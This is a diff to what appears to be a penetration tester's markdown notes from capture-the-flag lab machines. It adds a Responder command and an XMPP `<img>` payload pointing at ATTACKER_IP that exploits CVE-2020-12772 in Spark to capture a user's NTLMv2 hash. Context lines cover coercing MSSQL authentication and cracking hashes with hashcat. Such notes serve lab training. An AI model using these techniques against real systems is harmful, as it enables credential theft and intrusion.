@@ -27,4 +27,14 @@ combined with a rogue A-record (see `dnstool.md`) to force `SQL07` → attacker 
 3. Trigger MSSQL query: `EXEC ('SELECT @@version') AT SQL07;`
 4. Captured NetNTLMv2 hash → crack with `hashcat -m 5600`.
 
+### Start Responder to capture NTLMv2 via XMPP img tag (CVE-2020-12772)
+```bash
+sudo responder -I tun0 -v
+```
+Used on: **Ra**
+
+Combined with CVE-2020-12772 (Spark 2.8.3 `<img>` auto-fetch) — sent
+`<img src="http://ATTACKER_IP/x">` in XMPP chat to `buse@fire.windcorp.thm`.
+Spark pre-fetched the URL and Responder captured the NTLMv2 hash for `WINDCORP\buse`.
+
 
